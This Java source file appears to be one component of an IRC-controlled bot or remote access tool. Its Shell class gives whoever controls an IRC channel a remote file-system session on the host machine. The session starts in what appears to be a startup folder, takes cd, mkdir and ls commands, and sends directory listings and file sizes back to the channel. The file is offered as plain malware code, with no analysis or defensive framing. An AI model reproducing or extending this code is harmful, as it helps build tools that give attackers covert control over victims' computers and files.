import java.io.File;
import java.util.HashMap;

class Shell extends Thread {

	private static HashMap shells = new HashMap(20);

	private IRC irc;
	private String channel;
	private String currentDir;

	private boolean ls = false;

	public Shell(IRC irc, String channel) {
		this.irc = irc;
		this.channel = channel;
		this.currentDir = Util.findStartup();
		shells.put(channel, this);
		this.start();
	}

	public static Shell getShell(String channel) {
		return (Shell)shells.get(channel);
	}
	
	public void cd(String dir) {
		if(dir.indexOf(":\\") == -1) {
			File file = new File(this.currentDir + dir);
			if(file.exists()) {
				if(file.isDirectory()) {
					this.currentDir = this.currentDir + dir;
					if(!this.currentDir.endsWith("\\")) {
						this.currentDir = this.currentDir + "\\";
					}
				} else {
					this.irc.sendMessage(this.channel, "No such directory: " + dir);
				}
			} else {
				this.irc.sendMessage(this.channel, "No such directory: " + dir);
			}
		} else {
			File file = new File(dir);
			if(file.exists()) {
				if(file.isDirectory()) {
					this.currentDir = dir;
					if(!this.currentDir.endsWith("\\")) {
						this.currentDir = this.currentDir + "\\";
					}
				} else {
					this.irc.sendMessage(this.channel, "No such directory: " + dir);
				}
			} else {
				this.irc.sendMessage(this.channel, "No such directory: " + dir);
			}
		}
	}

	public void ls() {
		this.ls = true;
	}

	public void mkdir(String dir) {
		File f;
		if(dir.indexOf(":\\") == -1) {
			f = new File(this.currentDir + dir);
		} else {
			f = new File(dir);
		}
		if(f.exists()) {
			this.irc.sendMessage(this.channel, "Directory '" + dir + "' already exists!");
		} else {
			if(f.mkdir()) {
				this.irc.sendMessage(this.channel, "Directory '" + dir + "' created.");
			} else {
				this.irc.sendMessage(this.channel, "Could not create directory '" + dir + "'");
			}
		}
	}

	public void run() {
		while(true) {
			if(this.ls) {
				File dir = new File(this.currentDir);
				if(!dir.exists() || !dir.isDirectory()) {
					this.irc.sendMessage(this.channel, "No files found.");
					this.ls = false;
					continue;
				}
				this.irc.sendMessage(this.channel, "Contents of " + this.currentDir + ":");
				for(File file : dir.listFiles()) {
					if(file.isDirectory()) {
						this.irc.sendMessage(this.channel, file.getName());
					} else {
						long size = file.length();
						if(size >= (1024 * 1024 * 1024)) {
							this.irc.sendMessage(this.channel, file.getName() + " (" + (size / (1024 * 1024 * 1024)) + " GB)");
						} else if(size >= (1024 * 1024)) {
							this.irc.sendMessage(this.channel, file.getName() + " (" + (size / (1024 * 1024)) + " MB)");
						} else if(size >= 1024) {
							this.irc.sendMessage(this.channel, file.getName() + " (" + (size / 1024) + " KB)");
						} else if(size < 1024) {
							this.irc.sendMessage(this.channel, file.getName() + " (" + size + " bytes)");
						}
					}
					try {
						this.sleep(500);
					} catch(InterruptedException ie) {
					}
					}
				this.ls = false;
			}
			try {
				this.sleep(10);
			} catch(InterruptedException ie) {
			}
		}
	}

}